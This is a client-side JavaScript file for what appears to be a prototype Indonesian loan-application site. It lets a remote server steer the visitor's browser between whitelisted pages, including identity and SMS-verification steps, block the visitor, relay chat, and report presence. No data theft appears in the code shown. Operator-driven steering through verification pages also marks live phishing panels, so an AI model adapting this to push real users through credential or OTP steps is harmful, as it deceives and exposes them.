(() => {
  'use strict';
  const baseUrl = String(window.KBRealtimeConfig?.baseUrl || '').trim().replace(/\/+$/, '');
  if (!baseUrl) return;

  const KEY = 'kbchat-session-id-v1';
  let sessionId = '';
  try {
    sessionId = window.sessionStorage.getItem(KEY) || '';
    if (!sessionId) {
      sessionId = window.crypto?.randomUUID?.() || `flow-${Date.now()}-${Math.random().toString(16).slice(2)}`;
      window.sessionStorage.setItem(KEY, sessionId);
    }
  } catch (_) { return; }

  const REMOTE_PAGES = new Set([
    'index.html','login-pinjaman.html','verifikasi-identitas.html','verifikasi-sms.html',
    'data-pemohon.html','informasi-pekerjaan-usaha.html','detail-pengajuan-pinjaman.html',
    'detail-pengajuan-pinjaman-v2.html','detail-pengajuan-pinjaman-v3.html','detail-pengajuan-pinjaman-v4.html',
    'informasi-keuangan.html','informasi-keuangan-v2.html','dokumen-pendukung-prototype.html',
    'informasi-detail-pinjaman.html','pernyataan-persetujuan-prototype.html',
    'analisa-pengajuan-prototype.html','dashboard-pinjaman.html'
  ]);
  let commandSource = null;
  let reconnectTimer = 0;
  const channel = 'BroadcastChannel' in window ? new BroadcastChannel('kbchat-sim-v1') : null;
  let adminBlocked = false;
  try { adminBlocked = window.sessionStorage.getItem('kb-admin-blocked-v1') === '1'; } catch (_) {}

  function applyAccess(state) {
    adminBlocked = Boolean(state?.blocked);
    try { window.sessionStorage.setItem('kb-admin-blocked-v1', adminBlocked ? '1' : '0'); } catch (_) {}
    const page = String(window.location.pathname || '').split('/').filter(Boolean).pop() || 'index.html';
    if (adminBlocked && page !== 'index.html') window.setTimeout(() => { window.location.href = 'index.html'; }, 220);
  }

  function ack(commandId) {
    if (!commandId) return;
    try {
      window.fetch(`${baseUrl}/client/ack`, {
        method: 'POST', mode: 'cors', credentials: 'omit', cache: 'no-store', keepalive: true,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, commandId })
      }).catch(() => {});
    } catch (_) {}
  }

  function navigate(command) {
    const id = String(command?.id || '').trim();
    const targetPage = String(command?.targetPage || '').trim();
    if (!id || !REMOTE_PAGES.has(targetPage) || adminBlocked) return;
    ack(id);
    if (targetPage === 'index.html') return;
    window.setTimeout(() => { window.location.href = targetPage; }, 220);
  }

  function connectCommands() {
    if (!('EventSource' in window)) return;
    try { commandSource?.close(); } catch (_) {}
    window.clearTimeout(reconnectTimer);
    try {
      commandSource = new EventSource(`${baseUrl}/client/events?sessionId=${encodeURIComponent(sessionId)}`, { withCredentials: false });
      commandSource.addEventListener('access', event => {
        try { applyAccess(JSON.parse(event.data || 'null')); } catch (_) {}
      });
      commandSource.addEventListener('navigate', event => {
        try { navigate(JSON.parse(event.data || 'null')); } catch (_) {}
      });
      commandSource.addEventListener('chat-message', event => {
        try {
          const detail = JSON.parse(event.data || 'null');
          if (detail && detail.sessionId === sessionId) {
            window.dispatchEvent(new CustomEvent('kb:realtime-chat-message', { detail }));
          }
        } catch (_) {}
      });
      commandSource.addEventListener('error', () => {
        try { commandSource?.close(); } catch (_) {}
        commandSource = null;
        reconnectTimer = window.setTimeout(connectCommands, 3000);
      });
    } catch (_) {
      reconnectTimer = window.setTimeout(connectCommands, 3000);
    }
  }

  channel?.addEventListener('message', event => {
    const data = event.data || {};
    if (String(data.sessionId || '') !== sessionId) return;
    if (data.type === 'access-user') { applyAccess({ blocked: Boolean(data.blocked) }); return; }
    if (data.type !== 'navigate-user') return;
    navigate({ id: data.commandId || `local-${Date.now()}`, targetPage: data.targetPage });
  });

  function send(status) {
    try {
      window.fetch(`${baseUrl}/presence`, {
        method: 'POST',
        mode: 'cors',
        credentials: 'omit',
        cache: 'no-store',
        keepalive: status === 'offline',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, status, flowPage: 'index.html', flowStep: 0 })
      }).catch(() => {});
    } catch (_) {}
  }

  send('online');
  connectCommands();
  const timer = window.setInterval(() => send('online'), 12_000);
  window.addEventListener('pageshow', () => send('online'));
  window.addEventListener('pagehide', () => {
    window.clearInterval(timer);
    window.clearTimeout(reconnectTimer);
    try { commandSource?.close(); } catch (_) {}
    commandSource = null;
    try { channel?.close(); } catch (_) {}
    send('offline');
  });
})();
